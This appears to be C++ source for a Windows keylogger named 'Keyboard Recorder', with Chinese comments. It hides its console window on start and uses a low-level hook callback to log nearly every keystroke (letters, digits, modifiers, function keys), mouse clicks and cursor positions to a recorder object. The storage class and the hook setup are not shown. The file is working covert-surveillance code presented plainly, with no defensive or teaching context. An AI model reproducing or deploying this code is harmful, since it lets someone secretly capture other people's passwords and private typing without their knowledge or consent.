// Keyboard Recorder.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include"KbRecord.h"

namespace KbRecord
{
	KbRecord kbr;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam);

int main()
{
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
	KbRecord::kbr.Record();
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)//消息循环
{
	using namespace std;
	static int times = 1, cursor = 1;
	KBDLLHOOKSTRUCT *ks = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	static POINT t;
	switch (wParam)
	{
	case WM_KEYDOWN:
		times++;
		switch (ks->vkCode)
		{
		case VK_APPS:
			KbRecord::kbr << "检测到APP按下" << endl;
			break;
		case VK_LSHIFT:
		case VK_RSHIFT:
		case VK_SHIFT:
			KbRecord::kbr << "检测到shift按下" << endl;
			break;
		case VK_LMENU:
		case VK_RMENU:
		case VK_MENU:
			KbRecord::kbr << "检测到ALT按下" << endl;
			break;
		case VK_LCONTROL:
		case VK_RCONTROL:
		case VK_CONTROL:
			KbRecord::kbr << "检测到CTRL按下" << endl;
			break;
		case VK_BACK:
			KbRecord::kbr << "检测到BackSpace按下" << endl;
			break;
		case VK_RETURN:
			KbRecord::kbr << "检测到Enter按下" << endl;
			break;
		case  VK_RWIN:
		case  VK_LWIN:
			KbRecord::kbr << "检测到Win按下" << endl;
			break;
		case VK_CAPITAL:
			KbRecord::kbr << "检测到大写锁定按下" << endl;
			break;
		case VK_CANCEL:
			KbRecord::kbr << "检测到CTRL+BREAK按下" << endl;
			break;
		case VK_CLEAR:
			KbRecord::kbr << "检测到CLEAR按下" << endl;
			break;
		case VK_SPACE:
			KbRecord::kbr << "检测到空格按下" << endl;
			break;
		case VK_TAB:
			KbRecord::kbr << "检测到TAB按下" << endl;
			break;
		case VK_F1:
			KbRecord::kbr << "检测到F1按下" << endl;
			break;
		case VK_F2:
			KbRecord::kbr << "检测到F2按下" << endl;
			break;
		case VK_F3:
			KbRecord::kbr << "检测到F3按下" << endl;
			break;
		case VK_F4:
			KbRecord::kbr << "检测到F4按下" << endl;
			break;
		case VK_F5:
			KbRecord::kbr << "检测到F5按下" << endl;
			break;
		case VK_F6:
			KbRecord::kbr << "检测到F6按下" << endl;
			break;
		case VK_F7:
			KbRecord::kbr << "检测到F7按下" << endl;
			break;
		case VK_F8:
			KbRecord::kbr << "检测到F8按下" << endl;
			break;
		case VK_F9:
			KbRecord::kbr << "检测到F9按下" << endl;
			break;
		case VK_F10:
			KbRecord::kbr << "检测到F10按下" << endl;
			break;
		case VK_F11:
			KbRecord::kbr << "检测到F11按下" << endl;
			break;
		case VK_F12:
			KbRecord::kbr << "检测到F12按下" << endl;
			break;
		case VK_NUMPAD0:
		case 48:
			KbRecord::kbr << "检测到0按下" << endl;
			break;
		case VK_NUMPAD1:
		case 49:
			KbRecord::kbr << "检测到1按下" << endl;
			break;
		case VK_NUMPAD2:
		case 50:
			KbRecord::kbr << "检测到2按下" << endl;
			break;
		case VK_NUMPAD3:
		case 51:
			KbRecord::kbr << "检测到3按下" << endl;
			break;
		case VK_NUMPAD4:
		case 52:
			KbRecord::kbr << "检测到4按下" << endl;
			break;
		case VK_NUMPAD5:
		case 53:
			KbRecord::kbr << "检测到5按下" << endl;
			break;
		case VK_NUMPAD6:
		case 54:
			KbRecord::kbr << "检测到6按下" << endl;
			break;
		case VK_NUMPAD7:
		case 55:
			KbRecord::kbr << "检测到7按下" << endl;
			break;
		case VK_NUMPAD8:
		case 56:
			KbRecord::kbr << "检测到8按下" << endl;
			break;
		case VK_NUMPAD9:
		case 57:
			KbRecord::kbr << "检测到9按下" << endl;
			break;
		case 65:
			KbRecord::kbr << "检测到A按下" << endl;
			break;
		case 66:
			KbRecord::kbr << "检测到B按下" << endl;
			break;
		case 67:
			KbRecord::kbr << "检测到C按下" << endl;
			break;
		case 68:
			KbRecord::kbr << "检测到D按下" << endl;
			break;
		case 69:
			KbRecord::kbr << "检测到E按下" << endl;
			break;
		case 70:
			KbRecord::kbr << "检测到F按下" << endl;
			break;
		case 71:
			KbRecord::kbr << "检测到G按下" << endl;
			break;
		case 72:
			KbRecord::kbr << "检测到H按下" << endl;
			break;
		case 73:
			KbRecord::kbr << "检测到I按下" << endl;
			break;
		case 74:
			KbRecord::kbr << "检测到J按下" << endl;
			break;
		case 75:
			KbRecord::kbr << "检测到K按下" << endl;
			break;
		case 76:
			KbRecord::kbr << "检测到L按下" << endl;
			break;
		case 77:
			KbRecord::kbr << "检测到M按下" << endl;
			break;
		case 78:
			KbRecord::kbr << "检测到N按下" << endl;
			break;
		case 79:
			KbRecord::kbr << "检测到O按下" << endl;
			break;
		case 80:
			KbRecord::kbr << "检测到P按下" << endl;
			break;
		case 81:
			KbRecord::kbr << "检测到Q按下" << endl;
			break;
		case 82:
			KbRecord::kbr << "检测到R按下" << endl;
			break;
		case 83:
			KbRecord::kbr << "检测到S按下" << endl;
			break;
		case 84:
			KbRecord::kbr << "检测到T按下" << endl;
			break;
		case 85:
			KbRecord::kbr << "检测到U按下" << endl;
			break;
		case 86:
			KbRecord::kbr << "检测到V按下" << endl;
			break;
		case 87:
			KbRecord::kbr << "检测到W按下" << endl;
			break;
		case 88:
			KbRecord::kbr << "检测到X按下" << endl;
			break;
		case 89:
			KbRecord::kbr << "检测到Y按下" << endl;
			break;
		case 90:
			KbRecord::kbr << "检测到Z按下" << endl;
			break;
		case VK_ADD:
			KbRecord::kbr << "检测到+按下" << endl;
			break;
		case VK_SUBTRACT:
			KbRecord::kbr << "检测到-按下" << endl;
			break;
		case VK_DIVIDE:
			KbRecord::kbr << "检测到/按下" << endl;
			break;
		case VK_MULTIPLY:
			KbRecord::kbr << "检测到*按下" << endl;
			break;
		case 190:
		case VK_DECIMAL:
			KbRecord::kbr << "检测到.按下" << endl;
			break;
		case 186:
			KbRecord::kbr << "检测到;按下" << endl;
			break;
		case 188:
			KbRecord::kbr << "检测到,按下" << endl;
			break;
		case 219:
			KbRecord::kbr << "检测到[按下" << endl;
			break;
		case 221:
			KbRecord::kbr << "检测到]按下" << endl;
			break;
		case VK_ESCAPE:
			KbRecord::kbr << "检测到ESC按下" << endl;
			break;
		default:
			KbRecord::kbr << "未知按键，键值 " << ks->vkCode << endl;
		}
		break;
	case WM_KEYUP:
		switch (ks->vkCode)
		{
		case 160:
		case 161:
		case VK_SHIFT:
			KbRecord::kbr << "检测到shift弹起" << endl;
			break;
		case VK_MENU:
			KbRecord::kbr << "检测到ALT弹起" << endl;
			break;
		case VK_CONTROL:
			KbRecord::kbr << "检测到CTRL弹起" << endl;
			break;
		case VK_LBUTTON:
			KbRecord::kbr << "检测到鼠标左键弹起" << endl;
			break;
		case VK_RBUTTON:
			KbRecord::kbr << "检测到鼠标右键弹起" << endl;
			break;
		case  VK_LWIN:
		case  VK_RWIN:
			KbRecord::kbr << "检测到Win弹起" << endl;
			break;
		case VK_CAPITAL:
			KbRecord::kbr << "检测到大写锁定弹起" << endl;
			break;
		}
		break;
	case WM_MOUSEMOVE:
		cursor++;
		if (!(cursor % 25))//更改取余的数调节输出的频率
		{
			GetCursorPos(&t);
			KbRecord::kbr << "检测到鼠标移动，位置 ( " << t.x << " , " << t.y << " )" << endl;
		}
		break;
	case WM_LBUTTONDOWN:
		KbRecord::kbr << "检测到鼠标左键按下" << endl;
		break;
	case WM_RBUTTONDOWN:
		KbRecord::kbr << "检测到鼠标右键按下" << endl;
		break;
	case WM_MBUTTONDOWN:
		KbRecord::kbr << "检测到鼠标中键按下" << endl;
		break;
	case WM_SYSKEYDOWN:
		KbRecord::kbr << "按住ALT键同时按下其他键" << endl;
		break;
	}
	if (!(times % 7))//更改取余的数调节ProcessWarning()的频率
	{
		times = 1;
		KbRecord::kbr.ProcessWarning();
	}
	return CallNextHookEx(0, code, wParam, lParam);
}
